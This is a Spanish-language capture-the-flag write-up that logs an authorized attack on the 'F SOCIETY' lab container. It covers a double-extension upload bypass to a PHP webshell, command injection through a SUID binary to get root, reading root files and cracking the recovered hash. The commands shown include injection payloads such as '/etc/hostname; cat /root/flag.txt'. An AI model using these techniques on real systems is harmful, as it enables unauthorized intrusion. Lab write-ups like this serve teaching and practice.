# Bitácora — FSOCIETY

## 1. Contexto

- **Objetivo:** `172.17.0.2` (contenedor Docker `fsociety`).
- **Atacante:** Kali Linux, `172.17.0.1`.
- **Alcance:** auditoría autorizada del laboratorio Whoami-Labs «F SOCIETY» (SUID & Sudo, Hard).
- **Entorno:** laboratorio vivo levantado con `startlab.sh`; no se trabajó sobre una copia estática de la imagen.
- **Regla de trabajo:** no modificar `/root/flag.txt` ni el binario SUID; toda la evidencia se obtiene explotando la cadena real.

## 2. Cronología

### 07:30 — Preparación

- Se verifica el directorio de trabajo y se conserva el paquete original (`startlab.sh`, `fsociety.tar`).
- Se comprueba que el contenedor responde en `172.17.0.2`.
- Se decide documentar la ruta completa con evidencia reproducible, no solo el resultado final.

### 07:42 — Reconocimiento de puertos

```bash
nmap -Pn -p- --min-rate 5000 172.17.0.2
nmap -Pn -sV -sC -p22,80 172.17.0.2
```

Resultado:

- `22/tcp` — OpenSSH 7.6p1 Ubuntu-4ubuntu0.7.
- `80/tcp` — Apache httpd 2.4.29 (Ubuntu).
- 65 533 puertos cerrados.

Conclusión: la única superficie de entrada realista es la web. SSH queda como vía de movimiento lateral si aparecen credenciales, pero no hay credenciales iniciales.

Evidencia: `recon/nmap_full.txt`, `recon/nmap_services.txt`, `docs/img/01-recon-puertos.png`.

### 07:43 — Enumeración web

```bash
curl -si http://172.17.0.2/
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak,zip -t 40
```

Hallazgos:

- `/` — maqueta estática de E Corp (`index.html`, 6 204 B).
- `/upload.php` — portal de empleados con formulario de subida.
- `/uploads/` — listado de directorios habilitado.
- `/.htaccess`, `/.htpasswd`, `/server-status` — 403.
- Sin login, sin API y sin parámetros dinámicos aparte del formulario.

Evidencia: `recon/web_root.html`, `recon/web_upload.html`, `recon/gobuster_common.txt`, `recon/uploads_listing.txt`, `docs/img/02-web-ecorp.png`.

### 07:44 — Análisis de `upload.php`

El código confirma una validación débil:

```php
$file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
$allowed_exts = array('jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt');

if (in_array($file_ext, $allowed_exts)) {
    move_uploaded_file($file_tmp, $upload_dir . basename($file_name));
}
```

Observaciones:

- Solo se comprueba la **última extensión**.
- No hay validación MIME (`finfo_file`), de contenido ni de tamaño.
- El nombre original se conserva.
- El directorio `/var/www/html/uploads/` es `0777` y tiene listado.

Evidencia: `loot/08_upload_source.txt`, `loot/apache_config.txt`.

### 07:44 — Prueba del bypass de extensión

```bash
./exploits/test_upload_bypass.sh 172.17.0.2
```

Resultado:

- `bypass.php` → `Invalid file type`.
- `bypass.php.jpg` → `File uploaded successfully: bypass.php.jpg`.
- `GET /uploads/bypass.php.jpg?c=id` → `uid=33(www-data)`.

Conclusión: la whitelist se satisface con la última extensión, pero Apache ejecuta el fichero como PHP. Se confirma la hipótesis de la regex sin anclar.

Evidencia: `recon/upload_bypass.txt`, `docs/img/03-upload-portal.png`, `docs/img/04-bypass-extension.png`.

### 07:45 — Acceso inicial y enumeración

```bash
./exploits/upload_shell.sh 172.17.0.2
./exploits/webcmd.sh 'id; hostname; uname -a; head -4 /etc/os-release'
```

Resultado:

- `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.
- Hostname `fsociety`.
- Kernel del host de Kali (`7.1.5+kali-amd64`); userland Ubuntu 18.04.6 LTS.

Se enumeran usuarios (`elliot`, `darlene`, `angela`, `tyrell`), homes y el README de `elliot`:

```text
Remember: Enumeration is key. Check hidden files in user directories.
```

Evidencia: `loot/01_id_wwwdata.txt`, `loot/02_passwd.txt`, `loot/03_homes.txt`, `docs/img/05-rce-wwwdata.png`.

### 07:47 — Wordlist oculta y flag user

Se localiza `/home/tyrell/.tmp`:

```text
-rw-r--r-- 1 tyrell tyrell 3412 Feb 10  2026 /home/tyrell/.tmp
```

- 3 412 bytes, 240 líneas.
- World-readable (0644).
- Es una wordlist del universo Mr. Robot.
- La última línea es `FSOCIETY{pwn_k1t_3_c0rp_0wn3d}`.

Conclusión: la **flag user** se obtiene sin escalar privilegios, simplemente leyendo un fichero mal protegido.

Evidencia: `loot/04_tyrell_tmp.txt`, `wordlists/tyrell_tmp.txt`, `docs/img/06-enum-homes.png`.

### 07:47 — Inventario SUID y análisis de `filereader`

```bash
find / -perm -4000 -type f 2>/dev/null | sort
file /usr/local/bin/filereader
strings /usr/local/bin/filereader
```

Hallazgo:

```text
-rwsr-xr-x 1 root root 8520 Feb 10  2026 /usr/local/bin/filereader
setuid
setgid
system
File Reader v1.0
Usage: %s <filename>
cat %s 2>/dev/null || echo 'File not found'
```

Lógica reconstruida:

```c
setuid(0);
setgid(0);
snprintf(command, sizeof(command), "cat %s 2>/dev/null || echo 'File not found'", argv[1]);
system(command);
```

Dos vulnerabilidades:

1. Lectura arbitraria de ficheros con privilegios de root.
2. Inyección de comandos porque `argv[1]` se concatena sin comillas dentro de `system()`.

Evidencia: `loot/05_suid.txt`, `loot/06_filereader_meta.txt`, `docs/img/07-suid-filereader.png`.

### 07:48 — Escalada a root

```bash
/usr/local/bin/filereader "/etc/hostname; id"
/usr/local/bin/filereader "/etc/hostname; cat /root/flag.txt"
```

Resultado:

```text
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

`/root/flag.txt` (0600, 121 B) contiene:

```text
phillip_price:$6$hg7hrQCqa53OdOo$1YkvYxeBnOTCltn7lRMKqOyhUWIWTA/6yI7JjsCd9os68hvEhJQrwyDUlAr9if0j2hIj8BDIXfmp0JEUZ4i2r0
```

Conclusión: el SUID no solo lee el fichero, también permite ejecutar comandos como root. No fue necesario `sudo`.

Evidencia: `loot/13_root_id.txt`, `loot/12_root_listing.txt`, `loot/14_root_flag_hash.txt`, `docs/img/08-root-injection.png`.

### 07:50 — Vectores laterales descartados

- **Sudo:** `/etc/sudoers` concede privilegios a `root`, `%admin` y `%sudo`; el grupo `sudo` está vacío y el grupo `admin` no existe, así que `%admin` es inerte. Ningún usuario interactivo puede usar `sudo`; `sudo -n -l` pide contraseña. Es un señuelo.
- **Cron:** `/etc/crontab` ejecuta `/usr/local/bin/backup.sh` como root cada minuto; `backup.sh` hace `bash /tmp/backup.log`. `/tmp` es `1777`, así que sería una escalada trivial **si cron estuviera activo**. En el contenedor `cron` no está corriendo (`cron: unrecognized service`), por lo que se documenta como vulnerabilidad latente, no como camino real.
- **pkexec:** versión `0.105-20ubuntu0.18.04.6` (parchada frente a PwnKit); no se usa.

Evidencia: `loot/10_sudoers.txt`, `loot/09_cron.txt`, `loot/packages.txt`, `docs/img/12-vectores-laterales.png`.

### 08:40 — Primera validación fallida

Se prueba la flag user en el validador local:

```text
FSOCIETY{pwn_k1t_3_c0rp_0wn3d}
```

Resultado: **Flag incorrecta**.

Esto genera la duda inicial: la cadena parece la flag, pero `startlab.sh` la rechaza. Se revisa el script y se descubre que lee directamente `/root/flag.txt`:

```bash
ACTUAL_FLAG=$(docker exec $CONTAINER_NAME cat /root/flag.txt)
...
if [ -n "$input_flag" ] && [[ "$input_flag" == "$ACTUAL_FLAG" ]]; then
```

Como `/root/flag.txt` contiene el hash, la comparación exacta solo acepta el hash.

### 08:44 — Prueba de candidatos

Se comparan los candidatos contra el contenido literal del fichero:

| Candidato | Resultado |
|---|---|
| `FSOCIETY{pwn_k1t_3_c0rp_0wn3d}` | FAIL |
| `fsociety{pwn_k1t_3_c0rp_0wn3d}` | FAIL |
| `fs0c13ty{pwn_k1t_3_c0rp_0wn3d}` | FAIL |
| Hash sin prefijo `phillip_price:` | FAIL |
| Hash completo | **PASS** |

Evidencia: `loot/validation_candidates.txt`.

### 08:47 — Captura de la validación correcta

El usuario aporta la captura real de `startlab.sh`:

- Primer intento con `FSOCIETY{pwn_k1t_3_c0rp_0wn3d}` → **Flag incorrecta (1/5)**.
- Segundo intento con el hash completo → **«¡Felicitaciones! Has infiltrado E Corp.»**.
- Fecha y hora: **2026-10-22 08:47:36 -0600**.

Conclusión definitiva: la **flag root validada** es el contenido literal de `/root/flag.txt`, no una cadena `{...}`. La flag `{...}` es la **flag user**.

Evidencia: `docs/img/13-validacion-flag.png`.

### 08:59 — Crackeo del hash

```bash
./exploits/crack_flag.sh
```

Resultado:

```text
FSOCIETY{pwn_k1t_3_c0rp_0wn3d} (phillip_price)
1 password hash cracked, 0 left
```

El plaintext coincide con la flag user de `.tmp`, lo que confirma que el laboratorio reutiliza la misma cadena para ambas flags. Se generan:

- `loot/flag_user.txt` → `FSOCIETY{pwn_k1t_3_c0rp_0wn3d}`.
- `loot/flag_root.txt` → hash completo.
- `loot/flag.txt` → copia de la flag root validada.

Evidencia: `loot/16_john.txt`, `loot/17_flag.txt`, `docs/img/09-hash-crack.png`.

### 09:14 — Documentación

- Se redacta `README.md` con la cadena completa, las dos flags y la validación.
- Se generan las 12 capturas terminal con `shots/make_images.py`.
- Se incorpora la captura real de validación como `docs/img/13-validacion-flag.png`.
- Se crean `notes/bitacora.md`, y `exploits/README.md`.

## 3. Decisiones clave

1. **No reiniciar el laboratorio** para no perder el estado de la evidencia (webshell, ficheros subidos, hash leído).
2. **No modificar `/root/flag.txt`**: el hash es el original de la imagen; se leyó con el SUID.
3. **Distinguir flag user y flag root**: la primera está en `.tmp`; la segunda es el contenido de `/root/flag.txt`. El validador local solo comprueba la segunda.
4. **Documentar el cron como latente**: es una vulnerabilidad real, pero no se explotó porque el servicio no está activo. No se debe presentar como parte de la cadena.
5. **Usar la captura real del usuario** como prueba de validación, en lugar de simular el éxito.
6. **Mantener el hash completo en la documentación**: es la cadena exacta que acepta el validador; truncarlo impediría reproducir la validación.

## 4. Limitaciones y notas

- El laboratorio tiene dos flags; la plataforma puede mostrarlas en campos separados. Este writeup documenta ambas y explica cuál usa `startlab.sh`.
- La flag root es un hash SHA-512crypt, un formato poco habitual para una flag. Se mantiene el valor literal porque es lo que contiene el fichero y lo que valida el script.
- El hash es crackeable con la wordlist del propio sistema; esto refuerza el hallazgo, pero no era necesario para la escalada (el SUID ya permitía leer `/root/flag.txt`).
- `loot/10b_shadow.txt` contiene hashes de `/etc/shadow`; se excluye de la publicación mediante `.gitignore`.
- El contenedor sigue en ejecución con `cmd.php.jpg` y `bypass.php.jpg` en `/var/www/html/uploads/`; son artefactos del laboratorio, no de un sistema real.

## 5. Reproducción mínima

```bash
# 1. Reconocimiento
nmap -Pn -p- --min-rate 5000 172.17.0.2

# 2. Acceso inicial
./exploits/test_upload_bypass.sh 172.17.0.2
./exploits/upload_shell.sh 172.17.0.2

# 3. Enumeración y escalada
./exploits/enumerate_loot.sh
./exploits/crack_flag.sh

# 4. Validación local
# Introducir el contenido literal de /root/flag.txt en startlab.sh
```

## 6. Mapa de evidencia

| Etapa | Evidencia principal |
|---|---|
| Reconocimiento | `recon/nmap_full.txt`, `recon/nmap_services.txt` |
| Web | `recon/web_root.html`, `recon/web_upload.html`, `recon/gobuster_common.txt` |
| Bypass | `recon/upload_bypass.txt` |
| RCE | `loot/01_id_wwwdata.txt` |
| Flag user | `loot/04_tyrell_tmp.txt`, `loot/flag_user.txt` |
| SUID | `loot/05_suid.txt`, `loot/06_filereader_meta.txt` |
| Root | `loot/13_root_id.txt`, `loot/14_root_flag_hash.txt` |
| Crackeo | `loot/16_john.txt`, `loot/17_flag.txt` |
| Validación | `docs/img/13-validacion-flag.png`, `loot/validation_candidates.txt` |
| Vectores laterales | `loot/09_cron.txt`, `loot/10_sudoers.txt` |
